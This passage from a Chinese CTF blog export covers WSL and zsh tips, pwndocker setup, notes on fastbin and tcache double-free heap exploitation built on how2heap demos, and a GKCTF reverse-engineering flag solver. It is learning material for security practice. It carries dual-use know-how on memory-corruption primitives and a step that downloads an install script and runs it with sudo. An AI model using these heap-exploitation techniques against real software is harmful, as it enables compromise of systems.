会自动记录你访问过的目录, 通过 j 目录名 可以直接进行目录跳转, 而且目录名支持模糊匹配和自动补全, 例如你访问过 hadoop-1.0.0 目录, 输入j hado 即可正确跳转。j –stat 可以看你的历史路径库。</li><li>命令选项补全。在zsh中只需要键入 tar -<tab> 就会列出所有的选项和帮助说明</li><li>在当前目录下输入 .. 或 … , 或直接输入当前目录名都可以跳转, 你甚至不再需要输入 <code>cd</code> 命令了。在你知道路径的情况下, 比如 <code>/usr/local/bin</code> 你可以输入<code>cd /u/l/b</code> 然后按进行补全快速输入</li><li>目录浏览和跳转:输入 d, 即可列出你在这个会话里访问的目录列表, 输入列表前的序号, 即可直接跳转。</li><li>命令参数补全。键入<code>kill &lt;tab&gt;</code> 就会列出所有的进程名和对应的进程号</li><li>更智能的历史命令。在用或者方向上键查找历史命令时, zsh支持限制查找。比如, 输入ls, 然后再按方向上键, 则只会查找用过的ls命令。而此时使用则会仍然按之前的方式查找, 忽略 ls</li><li>多个终端会话共享历史记录</li><li>通配符搜索:<code>ls -l **/*.sh</code>, 可以递归显示当前目录下的 shell 文件, 文件少时可以代替 <code>find</code>。使用 <code>**/</code> 来递归搜索</li><li>扩展环境变量, 输入环境变量然后按 就可以转换成表达的值</li><li>在 .zshrc 中添加 <code>setopt HIST_IGNORE_DUPS</code> 可以消除重复记录, 也可以利用<code>sort -t &quot;;&quot; -k 2 -u ~/.zsh_history | sort -o ~/.zsh_history</code>手动清除</li></ul><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h3 id="1-子系统运行32位程序问题"><a href="#1-子系统运行32位程序问题" class="headerlink" title="1.子系统运行32位程序问题"></a><strong>1.子系统运行32位程序问题</strong></h3><blockquote><p>2020.5.30 上wsl2就没这个问题了</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install lib32ncurses5 lib32z1</span><br><span class="line">sudo apt install qemu-user-static</span><br><span class="line">sudo update-binfmts --install i386 /usr/bin/qemu-i386-static --magic <span class="string">&#x27;\x7fELF\x01\x01\x01\x03\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x03\x00\x01\x00\x00\x00&#x27;</span> --mask <span class="string">&#x27;\xff\xff\xff\xff\xff\xff\xff\xfc\xff\xff\xff\xff\xff\xff\xff\xff\xf8\xff\xff\xff\xff\xff\xff\xff&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="2-由第1个问题引发的依赖包问题-aptitude安装"><a href="#2-由第1个问题引发的依赖包问题-aptitude安装" class="headerlink" title="2.由第1个问题引发的依赖包问题-aptitude安装"></a><strong>2.由第1个问题引发的依赖包问题-aptitude</strong>安装</h3><p>aptitude 与 apt-get 一样, 是 Debian 及其衍生系统中功能极其强大的包管理工具。与 apt-get 不同的是, aptitude 在处理依赖问题上更佳一些。举例来说, aptitude 在删除一个包时, 会同时删除本身所依赖的包。这样, 系统中不会残留无用的包, 整个系统更为干净；aptitude在安装软件时, 会同时安装/更新其依赖包。</p><blockquote><p><strong>不过在国内源安装aptitude是会将apt删除的, 而删除后就找不到安装源了, 所以我安装的时候是用的Ubuntu自带源安装的, 就不会覆盖apt, 也就是apt和aptitude共存</strong></p></blockquote><p>以下是大佬(不是我0.0)总结的一些常用 aptitude 命令, 仅供参考。</p><p><em>aptitude update 更新可用的包列表</em><br><em>aptitude upgrade 升级可用的包</em><br><em>aptitude dist-upgrade 将系统升级到新的发行版</em><br><em>aptitude install pkgname 安装包</em><br><em>aptitude remove pkgname 删除包</em><br><em>aptitude purge pkgname 删除包及其配置文件</em><br><em>aptitude search string 搜索包</em><br><em>aptitude show pkgname 显示包的详细信息</em><br><em>aptitude clean 删除下载的包文件</em><br><em>aptitude autoclean 仅删除过期的包文件</em></p><ul><li><p>aptitude软件包列表中的软件包状态:</p><table><thead><tr><th>v</th><th>虚拟</th></tr></thead><tbody><tr><td>B</td><td>损坏</td></tr><tr><td>u</td><td>解包</td></tr><tr><td>C</td><td>预配置</td></tr><tr><td>H</td><td>预安装</td></tr><tr><td>c</td><td>卸载未清除</td></tr><tr><td>p</td><td>清除软件</td></tr><tr><td>i</td><td>已经安装</td></tr><tr><td>E</td><td>内部错误</td></tr></tbody></table></li><li><p>在aptitude软件包列表中的请求操作:</p><table><thead><tr><th>h</th><th>保持</th></tr></thead><tbody><tr><td>p</td><td>清除</td></tr><tr><td>d</td><td>删除（卸载）</td></tr><tr><td>B</td><td>损坏</td></tr><tr><td>i</td><td>安装</td></tr><tr><td>r</td><td>重装</td></tr><tr><td>u</td><td>升级</td></tr></tbody></table><p>有的问题 apt-get 解决不了, 必须使用 aptitude 解决, 有的问题, 用 aptitude 解决不了, 必须使用 apt-get</p><p><em>aptitude 解决得更好的地方: install, remove, reinstall（apt-get无此功能）, show（apt-get无此功能）, search（apt-get无此功能）, hold（apt-get无此功能）, unhold（apt-get无此功能）</em></p><p><em>apt-get 解决得更好的地方: source（aptitude无此功能）, build-dep （低版本的aptitude没有build-dep功能）</em></p><p><em>apt-get 跟 aptitude 没什么区别的地方: update, upgrade (apt-get upgrade=aptitude safe-upgrade, apt-get dist-upgrade=aptitude full-upgrgade)</em></p></li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>1.<a href="https://onlycaptain.github.io/2018/09/30/Windows%E4%B8%8BLinux%E5%AD%90%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB%E5%88%B0%E9%9D%9E%E7%B3%BB%E7%BB%9F%E7%9B%98">https://onlycaptain.github.io/2018/09/30/Windows%E4%B8%8BLinux%E5%AD%90%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB%E5%88%B0%E9%9D%9E%E7%B3%BB%E7%BB%9F%E7%9B%98</a><br>2.<a href="https://zhuanlan.zhihu.com/WindowsSubsystemForLinux">https://zhuanlan.zhihu.com/WindowsSubsystemForLinux</a><br>3.<a href="https://www.jianshu.com/p/dc32a75e2de4">https://www.jianshu.com/p/dc32a75e2de4</a><br>4.<a href="https://blog.csdn.net/shengerjianku/article/details/82290482">https://blog.csdn.net/shengerjianku/article/details/82290482</a><br>5.<a href="https://blog.csdn.net/yili_xie/article/details/4803314">https://blog.csdn.net/yili_xie/article/details/4803314</a><br>6.<a href="https://segmentfault.com/a/1190000013612471">https://segmentfault.com/a/1190000013612471</a></p>]]></content>
      
      
      <categories>
          
          <category> Tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Wsl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwndocker</title>
      <link href="/note-tool-pwndocker/"/>
      <url>/note-tool-pwndocker/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>由于比赛中经常要更换libc版本, 虚拟机总要切换来切去, 一会儿<code>ubutnu 16.04</code>, 一会儿<code>ubuntu18.04</code>的。</p><p>而<code>pwndocker</code>正是为了解决这个问题, 它继承了pwn的常用工具和各个版本的libc</p><p>官方项目: <a href="https://github.com/skysider/pwndocker">skysider/pwndocker</a></p><h3 id="included-software"><a href="#included-software" class="headerlink" title="included software"></a>included software</h3><ul><li><a href="https://github.com/Gallopsled/pwntools">pwntools</a> —— CTF framework and exploit development library</li><li><a href="https://github.com/pwndbg/pwndbg">pwndbg</a> —— a GDB plug-in that makes debugging with GDB suck less, with a focus on features needed by low-level software developers, hardware hackers, reverse-engineers and exploit developers</li><li><a href="https://github.com/scwuaptx/Pwngdb">pwngdb</a> —— gdb for pwn</li><li><a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a> —— facilitate ROP exploitation tool</li><li><a href="https://github.com/inaz2/roputils">roputils</a> —— A Return-oriented Programming toolkit</li><li><a href="https://github.com/david942j/one_gadget">one_gadget</a> —— A searching one-gadget of execve(‘/bin/sh’, NULL, NULL) tool for amd64 and i386</li><li><a href="https://github.com/angr/angr">angr</a> —— A platform-agnostic binary analysis framework</li><li><a href="https://github.com/radare/radare2">radare2</a> —— A rewrite from scratch of radare in order to provide a set of libraries and tools to work with binary files</li><li><a href="https://github.com/david942j/seccomp-tools">seccomp-tools</a> —— Provide powerful tools for seccomp analysis</li><li>linux_server[64] —— IDA 7.0 debug server for linux</li><li><a href="https://tmux.github.io/">tmux</a> —— a terminal multiplexer</li><li><a href="https://linux.die.net/man/1/ltrace">ltrace</a> —— trace library function call</li><li><a href="https://linux.die.net/man/1/strace">strace</a> —— trace system call</li></ul><h3 id="included-glibc"><a href="#included-glibc" class="headerlink" title="included glibc"></a>included glibc</h3><p>Default compiled glibc path is .<code>/glibc</code></p><ul><li>2.19 —— ubuntu 12.04 default libc version</li><li>2.23 —— ubuntu 16.04 default libc version</li><li>2.24 —— introduce vtable check in file struct</li><li>2.27 —— pwndocker default glibc version</li><li>2.28~2.31 —— latest libc versions</li></ul><h3 id="How-to-run-in-custom-libc-version"><a href="#How-to-run-in-custom-libc-version" class="headerlink" title="How to run in custom libc version"></a>How to run in custom libc version</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp /glibc/2.27/64/lib/ld-2.27.so /tmp/ld-2.27.so</span><br><span class="line">patchelf --set-interpreter /tmp/ld-2.27.so ./<span class="built_in">test</span></span><br><span class="line">LD_PRELOAD=./libc.so.6 ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process([<span class="string">&quot;/path/to/ld.so&quot;</span>, <span class="string">&quot;./test&quot;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;/path/to/libc.so.6&quot;</span>&#125;)</span><br></pre></td></tr></table></figure><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com -o get-docker.sh</span><br><span class="line">sudo sh get-docker.sh</span><br><span class="line">sudo usermod -aG docker $(whoami)</span><br></pre></td></tr></table></figure><ul><li>加完权限组以后记得注销或重启以生效</li></ul><h3 id="pwndocker安装"><a href="#pwndocker安装" class="headerlink" title="pwndocker安装"></a>pwndocker安装</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull skysider/pwndocker</span><br></pre></td></tr></table></figure><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ul><li><strong>Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?</strong> : 运行命令<code>sudo dockerd</code>即可</li></ul><h2 id="容器管理"><a href="#容器管理" class="headerlink" title="容器管理"></a>容器管理</h2><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d --privileged --name=pwner -v ~/work/pwner:/ctf/work skysider/pwndocker</span><br></pre></td></tr></table></figure><ul><li><code>--privileged</code> 表示特权级运行, 不加gdb调试会没有权限</li><li><code>--name=pwner</code>指定 容器 名字为<code>pwner</code></li><li><code>~/work/pwner:/ctf/work</code> 挂载<code>~/work/pwner</code>到容器<code>/ctf/work</code>目录, 方便我们在外部使用<code>vscode</code>编辑脚本</li></ul><p>第二次直接看id后运行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br><span class="line">docker start docker_id</span><br></pre></td></tr></table></figure><h3 id="进入"><a href="#进入" class="headerlink" title="进入"></a>进入</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it docker_id bash</span><br></pre></td></tr></table></figure><p>即可进入docker的shell</p><h3 id="停止"><a href="#停止" class="headerlink" title="停止"></a>停止</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker stop docker_id</span><br></pre></td></tr></table></figure><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rm docker_id</span><br></pre></td></tr></table></figure><h2 id="更换libc"><a href="#更换libc" class="headerlink" title="更换libc"></a>更换libc</h2><p>这里借鉴nuoye大佬的shell脚本并稍作修改, 实现自动化:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">id=pwner</span><br><span class="line">libc=<span class="variable">$1</span></span><br><span class="line">PWD=/ctf/work</span><br><span class="line">ELF=<span class="variable">$2</span></span><br><span class="line">EXP=<span class="variable">$3</span></span><br><span class="line">docker cp ./<span class="variable">$&#123;EXP&#125;</span> <span class="variable">$&#123;id&#125;</span>:<span class="variable">$&#123;PWD&#125;</span></span><br><span class="line">docker cp ./<span class="variable">$&#123;ELF&#125;</span> <span class="variable">$&#123;id&#125;</span>:<span class="variable">$&#123;PWD&#125;</span></span><br><span class="line">docker <span class="built_in">exec</span> -it <span class="variable">$&#123;id&#125;</span> chmod 777 <span class="variable">$&#123;PWD&#125;</span>/<span class="variable">$&#123;ELF&#125;</span></span><br><span class="line">docker <span class="built_in">exec</span> -it <span class="variable">$&#123;id&#125;</span> chmod 777 <span class="variable">$&#123;PWD&#125;</span>/<span class="variable">$&#123;EXP&#125;</span></span><br><span class="line">docker <span class="built_in">exec</span> -it <span class="variable">$&#123;id&#125;</span> cp /glibc/<span class="variable">$&#123;libc&#125;</span>/64/lib/ld-<span class="variable">$&#123;libc&#125;</span>.so <span class="variable">$&#123;PWD&#125;</span></span><br><span class="line">docker <span class="built_in">exec</span> -it <span class="variable">$&#123;id&#125;</span> cp /glibc/<span class="variable">$&#123;libc&#125;</span>/64/lib/libc.so.6 <span class="variable">$&#123;PWD&#125;</span></span><br><span class="line">docker <span class="built_in">exec</span> -it <span class="variable">$&#123;id&#125;</span> patchelf --set-interpreter <span class="variable">$&#123;PWD&#125;</span>/ld-<span class="variable">$&#123;libc&#125;</span>.so <span class="variable">$&#123;PWD&#125;</span>/<span class="variable">$&#123;ELF&#125;</span></span><br><span class="line">docker <span class="built_in">exec</span> -it <span class="variable">$&#123;id&#125;</span> tmux</span><br></pre></td></tr></table></figure><ul><li>id按需要更换</li><li><code>$1</code> 为传递的libc版本</li><li><code>$2</code> 为文件</li><li><code>$3</code> 为exp</li></ul><p>示例:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./auto_libc.sh 2.23 freenote exp.py</span><br></pre></td></tr></table></figure><p>具体功能就是将elf和python文件cp到docker上, 然后给予权限, 再将libc和ld（这里用2.29版本）移到/tmp下, 再用patchelf –set-interpreter修改elf的ld文件, 然后进入tmux</p><p>而在patch脚本中用如下指定libc执行:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;/tmp/elf&quot;</span>, env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;/tmp/libc.so.6&quot;</span>&#125;)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://nuoye-blog.github.io/2020/05/16/tool/Pwndocker%E7%AF%87">Pwndocker篇</a></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tool </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Double Free</title>
      <link href="/note-pwn-double-free/"/>
      <url>/note-pwn-double-free/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>学习double free的具体利用</li></ul><h2 id="Fastbin-Double-free"><a href="#Fastbin-Double-free" class="headerlink" title="Fastbin Double free"></a>Fastbin Double free</h2><p>Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放, 因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块, 相当于多个指针指向同一个堆块, 结合堆块的数据内容可以实现类似于类型混淆 (type confused) 的效果。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>这里我们还是用<code>how2heap</code>中的<a href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup.c">fastbin_dup.c</a>来学习</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  double_free gcc --version</span><br><span class="line">gcc (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0</span><br><span class="line">Copyright (C) 2017 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the <span class="built_in">source</span> <span class="keyword">for</span> copying conditions.  There is NO</span><br><span class="line">warranty; not even <span class="keyword">for</span> MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="line"></span><br><span class="line">➜  double_free gcc fastbin_dup.c -o fastbin_dup</span><br><span class="line">➜  double_free ./fastbin_dup</span><br><span class="line">This file demonstrates a simple double-free attack with fastbins.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0x7fffd4435260</span><br><span class="line">2nd malloc(8): 0x7fffd4435280</span><br><span class="line">3rd malloc(8): 0x7fffd44352a0</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0x7fffd4435260 again, things will crash because 0x7fffd4435260 is at the top of the free list.</span><br><span class="line">So, instead, we<span class="string">&#x27;ll free 0x7fffd4435280.</span></span><br><span class="line"><span class="string">Now, we can free 0x7fffd4435260 again, since it&#x27;</span>s not the head of the free list.</span><br><span class="line">Now the free list has [ 0x7fffd4435260, 0x7fffd4435280, 0x7fffd4435260 ]. If we malloc 3 <span class="built_in">times</span>, we<span class="string">&#x27;ll get 0x7fffd4435260 twice!</span></span><br><span class="line"><span class="string">1st malloc(8): 0x7fffd4435260</span></span><br><span class="line"><span class="string">2nd malloc(8): 0x7fffd4435280</span></span><br><span class="line"><span class="string">3rd malloc(8): 0x7fffd4435260</span></span><br></pre></td></tr></table></figure><p>解释得蛮清楚的, 但依旧惯例还是自己解释一波吧</p><ul><li><p>首先我们malloc三块chunk</p></li><li><p>然后free掉第一块</p></li><li><p>由于fastbin的机制原因, 它在执行<code>free</code>时会验证<code>main_arena</code>直接指向的块, 即指针头部的块。因此如果我们再一次<code>free</code>chunk1, 会报错。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Another simple check: make sure the top of the bin is not the</span></span><br><span class="line"><span class="comment">       record we are going to add (i.e., double free).  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接再一次free chunk1:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@6268e63608bf:/ctf/work<span class="comment"># ./elf</span></span><br><span class="line">This file demonstrates a simple double-free attack with fastbins.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0x55d65bb9f010</span><br><span class="line">2nd malloc(8): 0x55d65bb9f030</span><br><span class="line">3rd malloc(8): 0x55d65bb9f050</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0x55d65bb9f010 again, things will crash because 0x55d65bb9f010 is at the top of the free list.</span><br><span class="line">*** Error <span class="keyword">in</span> `./elf<span class="string">&#x27;: double free or corruption (fasttop): 0x000055d65bb9f010 ***</span></span><br><span class="line"><span class="string">Aborted (core dumped)</span></span><br></pre></td></tr></table></figure></li><li><p>但是它也只检测了第一块, 对链表后面的块却没有执行检测, 因此我们先<code>free chunk2</code>, 再<code>free chunk1</code>是没有问题的, 我们在三个<code>free</code>后下断来看一下<code>fast bin</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x555555757020 —▸ 0x555555757000 ◂— 0x555555757020 /* &#x27; puUUU&#x27; */</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure></li><li><p>然后我们再申请回来三个chunk, 就会发现我们第一个申请的chunk和第三个申请的chunk是同一个chunk</p></li><li><p>这就是<code>fast bin</code>的<code>double free</code></p></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过 fastbin double free 我们可以使用多个指针控制同一个堆块, 这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。 如果更进一步修改 fd 指针, 则能够实现任意地址分配堆块的效果 (首先要通过验证), 这就相当于任意地址写任意值的效果。</p><h2 id="Tcache-Double-free"><a href="#Tcache-Double-free" class="headerlink" title="Tcache Double free"></a>Tcache Double free</h2><p>类似于fastbin, 但是tcache free时没有会验证<code>main_arena</code>直接指向的块</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static __always_inline void</span><br><span class="line">tcache_put (mchunkptr chunk, size_t tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出, <code>tcache_put()</code> 的检查也可以忽略不计（甚至没有对 <code>tcache-&gt;counts[tc_idx]</code> 的检查）, 大幅提高性能的同时安全性也下降了很多。</p><p>因为没有任何检查, 所以我们可以对同一个 chunk 多次 free, 造成 cycliced list。</p><h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><p>这里以<a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_dup.c">tcache_dup.c</a>为例</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  Desktop ./tcache_dup</span><br><span class="line">This file demonstrates a simple double-free attack with tcache.</span><br><span class="line">Allocating buffer.</span><br><span class="line">malloc(8): 0xff4e5160</span><br><span class="line">Freeing twice...</span><br><span class="line"></span><br><span class="line">Now the free list has [ 0xff4e5160, 0xff4e5160 ].</span><br><span class="line">Next allocated buffers will be same: [ 0xff4e5160, 0xff4e5160 ].</span><br></pre></td></tr></table></figure><ul><li><p>首先我们malloc一块大小为8的chunk</p></li><li><p>然后我们直接free两次, 现在看<code>tcache bins</code>, 可以看到已经形成环链</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/tcache_bins.jpg" alt="tcache_bins"></p></li><li><p>这时我们<code>malloc(8)</code>两次, 这时两个chunk指针指向了同一个chunk</p></li></ul><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p><a href="https://lantern.cool/wp-item-0ctf-2016-freenote/">0CTF 2016 freenote</a></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Double Free </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 GKCTF</title>
      <link href="/wp-games-2020gkctf/"/>
      <url>/wp-games-2020gkctf/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul><li>还是太菜了……..</li><li>这周看看把其他题也复现了</li></ul><h2 id="Ez-Machine"><a href="#Ez-Machine" class="headerlink" title="Ez Machine"></a>Ez Machine</h2><p>先理解一下每个function, 对其重命名</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200703175626255.png" alt="image-20200703175626255"></p><p>然后对这里直接下断, 获取每次的运行的函数</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200703175710676.png" alt="image-20200703175710676"></p><p>接着可以理解一下流程并调试可知</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">虚拟机对输入的字符进行了3个判断, 小写字母, 大写字母和其他字符。小写字母异或0x47 + 1, 大写字母异或0x4b - 1。然后所有字符都会去除16求商求余</span><br></pre></td></tr></table></figure><p>接着进行求解:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = [  <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0x0C</span>, <span class="number">0x02</span>, <span class="number">0x07</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x0B</span>, <span class="number">0x07</span>,  <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x03</span>, <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x06</span>, <span class="number">0x03</span>, <span class="number">0x07</span>, <span class="number">0x03</span>, <span class="number">0x08</span>, <span class="number">0x03</span>, <span class="number">0x09</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x0D</span>, <span class="number">0x07</span>, <span class="number">0x07</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x01</span>, <span class="number">0x0C</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x05</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x05</span>, <span class="number">0x0F</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x07</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x07</span>, <span class="number">0x02</span>, <span class="number">0x0C</span>, <span class="number">0x02</span>, <span class="number">0x02</span>]</span><br><span class="line"></span><br><span class="line">s = s[::-<span class="number">1</span>]</span><br><span class="line">s = s[:<span class="number">34</span>]</span><br><span class="line"></span><br><span class="line">xor_num1 = <span class="number">0x47</span></span><br><span class="line">xor_num2 = <span class="number">0x4B</span></span><br><span class="line">add_one = <span class="number">0x1</span></span><br><span class="line">sub_one = <span class="number">0x1</span></span><br><span class="line"></span><br><span class="line">new_s = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">17</span>):</span><br><span class="line">  t = s[i * <span class="number">2</span> + <span class="number">1</span>] * <span class="number">0x10</span></span><br><span class="line">  new_s.append(t + s[i * <span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(new_s)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(new_s))</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">small_num = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">  small_num.append(((<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + i) ^ xor_num1) + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">big_num = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">  big_num.append(((<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) + i) ^ xor_num2) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> new_s:</span><br><span class="line">  <span class="keyword">if</span> i <span class="keyword">in</span> small_num:</span><br><span class="line">    flag += <span class="built_in">chr</span>((i - <span class="number">1</span>) ^ xor_num1)</span><br><span class="line">  <span class="keyword">elif</span> i <span class="keyword">in</span> big_num:</span><br><span class="line">    flag += <span class="built_in">chr</span>((i + <span class="number">1</span>) ^ xor_num2)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    flag += <span class="built_in">chr</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(flag))</span><br></pre></td></tr></table></figure><ul><li>其中s在动态运行的过程中直接dump</li></ul><h2 